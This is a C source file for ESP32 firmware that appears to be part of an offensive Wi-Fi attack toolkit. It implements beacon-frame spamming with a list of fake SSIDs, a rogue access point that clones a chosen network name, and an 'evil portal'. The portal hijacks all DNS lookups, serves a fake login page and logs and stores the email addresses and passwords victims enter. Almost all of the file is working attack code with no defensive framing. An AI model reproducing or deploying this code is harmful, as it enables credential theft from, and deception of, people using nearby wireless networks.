#include <stdatomic.h>
#include <string.h>
#include <stdlib.h>
#include <inttypes.h>

#include "beacon_spam.h"
#include "wifi_sniffer.h"
#include "led_indicator.h"
#include "deauth_engine.h"
#include "cred_sniffer.h"
#include "handshake_crack.h"
#include "stealth.h"
#include "watchdog.h"
#include "wifi_tx_fix.h"

#include "esp_wifi.h"
#include "esp_mac.h"
#include "esp_timer.h"
#include "esp_http_server.h"
#include "esp_netif.h"
#include "esp_log.h"

#include "lwip/sockets.h"
#include "lwip/netdb.h"

#include "freertos/FreeRTOS.h"
#include "freertos/task.h"

static const char *TAG = "beacon_spam";

/* ==========================================================================
 *  SECTION 1: BEACON SPAM
 * ========================================================================== */

static atomic_bool g_beacon_spam_active = ATOMIC_VAR_INIT(false);
static TaskHandle_t g_beacon_task_handle = NULL;

static char g_beacon_ssids[MAX_BEACON_SSIDS][33];
static int g_beacon_ssid_count = 0;
static uint8_t g_beacon_channel = 1;
static uint32_t g_beacon_interval_ms = 100;
static uint8_t g_beacon_base_mac[6];
static uint16_t g_beacon_seq = 0;

static const char *const BUILTIN_BEACONS[] = {
    "FREE_WIFI", "FBI_Surveillance_Van", "NeverGonnaGiveYouUp",
    "Password_is_12345678", "Get_Your_Own_WiFi", "Mom_Use_This_One",
    "PrettyFlyForAWiFi", "Drop_It_Like_Its_Hotspot", "No_Internet_Here",
    "Virus_Distribution_Center", "Loading...", "404_Network_Not_Found",
    "The_LAN_Before_Time", "Wu-Tang_LAN", "Bill_Wi_the_Science_Fi",
    "I_Can_Hear_You_Typing", "Tell_My_WiFi_Love_Her", "It_Hurts_When_IP",
    "LAN_Solo", "The_Promised_LAN", "Hide_Yo_Kids_Hide_Yo_WiFi",
    "Connecting...", "TP-LINK_5G", "DIRECT-Apple-TV", "AndroidAP",
    "xfinitywifi", "attwifi", "Starbucks_WiFi", "Airport_Free_WiFi",
    "School_Guest"
};
#define BUILTIN_BEACON_COUNT (sizeof(BUILTIN_BEACONS) / sizeof(BUILTIN_BEACONS[0]))

static size_t build_beacon(uint8_t *f, const char *ssid, const uint8_t *bssid,
                           uint8_t channel, uint16_t seq)
{
    size_t i = 0;
    
    /* Frame control: Management, Beacon (0x80) */
    f[i++] = 0x80; f[i++] = 0x00;
    f[i++] = 0x00; f[i++] = 0x00;                 /* Duration */
    
    memset(f + i, 0xFF, 6); i += 6;               /* DA: Broadcast */
    memcpy(f + i, bssid, 6); i += 6;              /* SA: BSSID */
    memcpy(f + i, bssid, 6); i += 6;              /* BSSID */
    
    /* Sequence Control: Frag (4 bits) + Seq (12 bits) */
    uint16_t seq_ctrl = (seq & 0x0FFF) << 4;
    f[i++] = (uint8_t)(seq_ctrl & 0xFF);
    f[i++] = (uint8_t)((seq_ctrl >> 8) & 0xFF);

    /* Fixed params: Timestamp(8) + Beacon Interval(2) + Capability Info(2) */
    memset(f + i, 0, 8); i += 8;                  /* Timestamp */
    f[i++] = 0x64; f[i++] = 0x00;                 /* Interval: 100 TU */
    f[i++] = 0x01; f[i++] = 0x00;                 /* Cap Info: ESS, Open */

    /* SSID Tag */
    size_t slen = strlen(ssid);
    if (slen > 32) slen = 32;
    f[i++] = 0x00; f[i++] = (uint8_t)slen;
    memcpy(f + i, ssid, slen); i += slen;

    /* Supported Rates */
    static const uint8_t rates[] = {0x01, 0x08, 0x82, 0x84, 0x8b, 0x96, 0x0c, 0x12, 0x18, 0x24};
    memcpy(f + i, rates, sizeof(rates)); i += sizeof(rates);

    /* DS Parameter Set (Channel) */
    f[i++] = 0x03; f[i++] = 0x01; f[i++] = channel;

    return i;
}

static void beacon_spam_task(void *arg)
{
    uint8_t frame[128];
    int idx = 0;

    while (atomic_load(&g_beacon_spam_active)) {
        watchdog_task_refresh(TAG);
        
        if (g_beacon_ssid_count == 0) {
            vTaskDelay(pdMS_TO_TICKS(100));
            continue;
        }

        uint8_t bssid[6];
        memcpy(bssid, g_beacon_base_mac, 6);
        bssid[5] = (uint8_t)((g_beacon_base_mac[5] + idx) & 0xFF);
        bssid[0] = (bssid[0] & 0xFE) | 0x02;      /* Locally administered MAC */

        size_t len = build_beacon(frame, g_beacon_ssids[idx], bssid,
                                  g_beacon_channel, g_beacon_seq++);
        wifi_tx_safe(WIFI_IF_AP, frame, len);

        idx = (idx + 1) % g_beacon_ssid_count;
        vTaskDelay(pdMS_TO_TICKS(g_beacon_interval_ms));
    }
    
    g_beacon_task_handle = NULL;
    vTaskDelete(NULL);
}

esp_err_t beacon_spam_start(const char **ssids, int count, uint8_t channel, uint32_t interval_ms)
{
    if (ssids == NULL || count <= 0) return ESP_ERR_INVALID_ARG;

    esp_err_t rc = stealth_check_tx("beacon_spam");
    if (rc != ESP_OK) {
        ESP_LOGE(TAG, "stealth blocked beacon_spam start");
        return rc;
    }

    /* Ensure mutual exclusivity with other radio modes */
    if (atomic_load(&g_wifi_sniffer_active)) wifi_sniffer_stop();
    if (atomic_load(&g_rogue_active)) rogue_ap_stop();
    if (atomic_load(&g_portal_active)) evil_portal_stop();
    if (deauth_is_active()) deauth_stop();

    if (count > MAX_BEACON_SSIDS) count = MAX_BEACON_SSIDS;

    g_beacon_ssid_count = 0;
    for (int i = 0; i < count; i++) {
        snprintf(g_beacon_ssids[i], sizeof(g_beacon_ssids[i]), "%s", ssids[i]);
        g_beacon_ssid_count++;
    }

    g_beacon_channel = (channel >= 1 && channel <= 13) ? channel : 1;
    g_beacon_interval_ms = (interval_ms >= 20) ? interval_ms : 100;

    /* Bring up AP interface for raw TX */
    wifi_mode_t mode;
    esp_wifi_get_mode(&mode);
    if (mode == WIFI_MODE_NULL || mode == WIFI_MODE_STA) {
        esp_wifi_set_mode(WIFI_MODE_AP);
        wifi_config_t ap = {0};
        snprintf((char *)ap.ap.ssid, sizeof(ap.ap.ssid), "esp_tx");
        ap.ap.ssid_len = 6;
        ap.ap.channel = g_beacon_channel;
        ap.ap.authmode = WIFI_AUTH_OPEN;
        ap.ap.max_connection = 0;
        esp_wifi_set_config(WIFI_IF_AP, &ap);
        esp_wifi_start();
    }
    
    esp_wifi_set_channel(g_beacon_channel, WIFI_SECOND_CHAN_NONE);
    esp_read_mac(g_beacon_base_mac, ESP_MAC_WIFI_SOFTAP);

    atomic_store(&g_beacon_spam_active, true);
    led_set_state(LED_STATE_SCANNING);

    if (xTaskCreatePinnedToCore(beacon_spam_task, "beacon_spam", 4096,
                                NULL, 5, &g_beacon_task_handle, 0) != pdPASS) {
        atomic_store(&g_beacon_spam_active, false);
        return ESP_FAIL;
    }
    
    ESP_LOGI(TAG, "Beacon spam: %d SSIDs on ch %u", g_beacon_ssid_count, g_beacon_channel);
    return ESP_OK;
}

esp_err_t beacon_spam_start_builtin(uint8_t channel)
{
    return beacon_spam_start(BUILTIN_BEACONS, (int)BUILTIN_BEACON_COUNT, channel, 50);
}

void beacon_spam_stop(void)
{
    atomic_store(&g_beacon_spam_active, false);
    if (g_beacon_task_handle != NULL) {
        vTaskDelay(pdMS_TO_TICKS(150)); /* Wait for task to exit */
        g_beacon_task_handle = NULL;
    }
    led_set_state(LED_STATE_IDLE);
}

bool beacon_spam_is_active(void) { return atomic_load(&g_beacon_spam_active); }

/* ==========================================================================
 *  SECTION 2: ROGUE AP CLONE
 * ========================================================================== */

static atomic_bool g_rogue_active = ATOMIC_VAR_INIT(false);
static char g_rogue_ssid[33] = {0};

esp_err_t rogue_ap_start(const char *ssid, uint8_t channel, bool open)
{
    if (ssid == NULL || ssid[0] == '\0') return ESP_ERR_INVALID_ARG;

    if (atomic_load(&g_wifi_sniffer_active)) wifi_sniffer_stop();
    if (atomic_load(&g_beacon_spam_active)) beacon_spam_stop();
    if (atomic_load(&g_portal_active)) evil_portal_stop();
    if (deauth_is_active()) deauth_stop();

    snprintf(g_rogue_ssid, sizeof(g_rogue_ssid), "%s", ssid);

    wifi_config_t ap = {0};
    size_t ssid_len = strlen(ssid);
    if (ssid_len > sizeof(ap.ap.ssid)) ssid_len = sizeof(ap.ap.ssid);
    memcpy((char *)ap.ap.ssid, ssid, ssid_len);
    ap.ap.ssid_len = (uint8_t)ssid_len;
    ap.ap.channel = (channel >= 1 && channel <= 13) ? channel : 6;
    ap.ap.max_connection = 8;
    ap.ap.ssid_hidden = 0;

    if (open) {
        ap.ap.authmode = WIFI_AUTH_OPEN;
    } else {
        ap.ap.authmode = WIFI_AUTH_WPA2_PSK;
        snprintf((char *)ap.ap.password, sizeof(ap.ap.password), "password");
    }

    esp_err_t r = esp_wifi_set_mode(WIFI_MODE_AP);
    if (r != ESP_OK) return r;
    r = esp_wifi_set_config(WIFI_IF_AP, &ap);
    if (r != ESP_OK) return r;
    r = esp_wifi_start();
    if (r != ESP_OK) return r;

    atomic_store(&g_rogue_active, true);
    led_set_state(LED_STATE_CONNECTED);
    ESP_LOGI(TAG, "Rogue AP up: '%s' ch %u %s", ssid, ap.ap.channel, open ? "OPEN" : "WPA2");
    return ESP_OK;
}

void rogue_ap_stop(void)
{
    if (!atomic_load(&g_rogue_active)) return;
    esp_wifi_stop();
    esp_wifi_set_mode(WIFI_MODE_NULL);
    esp_wifi_start();
    atomic_store(&g_rogue_active, false);
    led_set_state(LED_STATE_IDLE);
}

bool rogue_ap_is_active(void) { return atomic_load(&g_rogue_active); }

/* ==========================================================================
 *  SECTION 3: EVIL PORTAL (Captive Portal)
 * ========================================================================== */

static httpd_handle_t g_portal_httpd = NULL;
static TaskHandle_t g_dns_task_handle = NULL;
static atomic_bool g_portal_active = ATOMIC_VAR_INIT(false);
static atomic_bool g_dns_run = ATOMIC_VAR_INIT(false);

static const char PORTAL_HTML[] =
"<!DOCTYPE html><html><head><meta name=viewport content='width=device-width,initial-scale=1'>"
"<title>Sign in</title><style>"
"body{font-family:sans-serif;background:#f5f5f5;display:flex;justify-content:center;padding-top:40px}"
".c{background:#fff;padding:24px;border-radius:8px;width:300px;box-shadow:0 2px 8px #0002}"
"h2{margin:0 0 12px;font-size:18px}input{width:100%;padding:10px;margin:6px 0;border:1px solid #ccc;border-radius:4px;box-sizing:border-box}"
"button{width:100%;padding:12px;background:#1a73e8;color:#fff;border:0;border-radius:4px;font-size:15px;margin-top:8px}"
"</style></head><body><div class=c>"
"<h2>Network Login Required</h2>"
"<p style='color:#666;font-size:13px'>Enter your Wi-Fi password to continue.</p>"
"<form method=POST action=/login>"
"<input name=email type=email placeholder='Email' required>"
"<input name=password type=password placeholder='Password' required>"
"<button type=submit>Connect</button></form></div></body></html>";

static const char PORTAL_OK[] =
"<!DOCTYPE html><html><body style='font-family:sans-serif;text-align:center;padding:40px'>"
"<h2>Connected</h2><p>You may close this page.</p></body></html>";

/* Simple URL decoder for form data */
static void url_decode(char *str) {
    char *src = str, *dst = str;
    while (*src) {
        if (*src == '+') {
            *dst++ = ' ';
            src++;
        } else if (*src == '%' && src[1] && src[2]) {
            char hex[3] = { src[1], src[2], 0 };
            *dst++ = (char)strtol(hex, NULL, 16);
            src += 3;
        } else {
            *dst++ = *src++;
        }
    }
    *dst = '\0';
}

static esp_err_t portal_get_handler(httpd_req_t *req)
{
    httpd_resp_set_type(req, "text/html");
    httpd_resp_send(req, PORTAL_HTML, HTTPD_RESP_USE_STRLEN);
    return ESP_OK;
}

static esp_err_t portal_login_handler(httpd_req_t *req)
{
    char body[256] = {0};
    int r = httpd_req_recv(req, body, sizeof(body) - 1);
    if (r > 0) {
        cred_hit_t hit;
        memset(&hit, 0, sizeof(hit));
        snprintf(hit.host, sizeof(hit.host), "EVIL-PORTAL:%s", g_rogue_ssid);
        
        extract_kv(body, "email=", hit.user, sizeof(hit.user));
        if (!hit.user[0]) extract_kv(body, "username=", hit.user, sizeof(hit.user));
        extract_kv(body, "password=", hit.pass, sizeof(hit.pass));
        
        /* Decode URL-encoded characters like %20 or + */
        url_decode(hit.user);
        url_decode(hit.pass);
        
        hit.time_us = esp_timer_get_time();
        creds_push(&hit);

        if (hit.pass[0]) {
            handshake_save_password(g_rogue_ssid, hit.pass);
        }
        ESP_LOGW(TAG, "PORTAL CAPTURE user=%s pass=%s", hit.user, hit.pass);
    }

    httpd_resp_set_type(req, "text/html");
    httpd_resp_send(req, PORTAL_OK, HTTPD_RESP_USE_STRLEN);
    return ESP_OK;
}

static esp_err_t portal_catch_handler(httpd_req_t *req)
{
    return portal_get_handler(req);
}

static void dns_hijack_task(void *arg)
{
    int sock = socket(AF_INET, SOCK_DGRAM, IPPROTO_IP);
    if (sock < 0) { vTaskDelete(NULL); return; }

    /* Set timeout so task can exit cleanly when g_dns_run becomes false */
    struct timeval timeout = { .tv_sec = 1, .tv_usec = 0 };
    setsockopt(sock, SOL_SOCKET, SO_RCVTIMEO, &timeout, sizeof(timeout));

    struct sockaddr_in addr = {
        .sin_family = AF_INET,
        .sin_port = htons(53),
        .sin_addr.s_addr = htonl(INADDR_ANY)
    };
    bind(sock, (struct sockaddr *)&addr, sizeof(addr));

    uint8_t buf[512];
    while (atomic_load(&g_dns_run)) {
        watchdog_task_refresh("dns_hijack");
        struct sockaddr_in src;
        socklen_t sl = sizeof(src);
        int n = recvfrom(sock, buf, sizeof(buf), 0, (struct sockaddr *)&src, &sl);
        if (n < 12) continue;

        uint8_t resp[512];
        memcpy(resp, buf, n);
        resp[2] = 0x81; resp[3] = 0x80;   /* flags: response, no error */
        resp[6] = 0x00; resp[7] = 0x01;   /* ANCOUNT = 1 */
        resp[8] = 0x00; resp[9] = 0x00;   /* NSCOUNT */
        resp[10] = 0x00; resp[11] = 0x00; /* ARCOUNT */

        int i = n;
        resp[i++] = 0xC0; resp[i++] = 0x0C; /* pointer to QNAME at offset 12 */
        resp[i++] = 0x00; resp[i++] = 0x01; /* type A */
        resp[i++] = 0x00; resp[i++] = 0x01; /* class IN */
        resp[i++] = 0x00; resp[i++] = 0x00; resp[i++] = 0x00; resp[i++] = 0x1E; /* TTL 30s */
        resp[i++] = 0x00; resp[i++] = 0x04; /* RDLENGTH 4 */
        resp[i++] = 192; resp[i++] = 168; resp[i++] = 4; resp[i++] = 1;

        sendto(sock, resp, i, 0, (struct sockaddr *)&src, sl);
    }
    close(sock);
    g_dns_task_handle = NULL;
    vTaskDelete(NULL);
}

esp_err_t evil_portal_start(const char *ssid, uint8_t channel)
{
    esp_err_t r = rogue_ap_start(ssid, channel, true);
    if (r != ESP_OK) return r;

    /* Create default AP netif (ignore if already exists) */
    esp_netif_create_default_wifi_ap();

    atomic_store(&g_dns_run, true);
    xTaskCreatePinnedToCore(dns_hijack_task, "dns_hijack", 4096, NULL, 4, &g_dns_task_handle, 1);

    httpd_config_t cfg = HTTPD_DEFAULT_CONFIG();
    cfg.server_port = 80;
    cfg.max_uri_handlers = 8;
    cfg.uri_match_fn = httpd_uri_match_wildcard;

    if (httpd_start(&g_portal_httpd, &cfg) != ESP_OK) {
        evil_portal_stop();
        return ESP_FAIL;
    }

    httpd_uri_t u_root = { .uri = "/", .method = HTTP_GET, .handler = portal_get_handler };
    httpd_uri_t u_login = { .uri = "/login", .method = HTTP_POST, .handler = portal_login_handler };
    httpd_uri_t u_all = { .uri = "/*", .method = HTTP_GET, .handler = portal_catch_handler };
    httpd_register_uri_handler(g_portal_httpd, &u_root);
    httpd_register_uri_handler(g_portal_httpd, &u_login);
    httpd_register_uri_handler(g_portal_httpd, &u_all);

    atomic_store(&g_portal_active, true);
    ESP_LOGI(TAG, "Evil portal live on '%s' (http://192.168.4.1/)", ssid);
    return ESP_OK;
}

void evil_portal_stop(void)
{
    atomic_store(&g_dns_run, false);
    if (g_dns_task_handle != NULL) {
        vTaskDelay(pdMS_TO_TICKS(150)); /* Wait for DNS task to timeout and exit */
        g_dns_task_handle = NULL;
    }
    
    if (g_portal_httpd) {
        httpd_stop(g_portal_httpd);
        g_portal_httpd = NULL;
    }
    atomic_store(&g_portal_active, false);
    rogue_ap_stop();
}

void evil_portal_print_creds(void)
{
    creds_print();
}
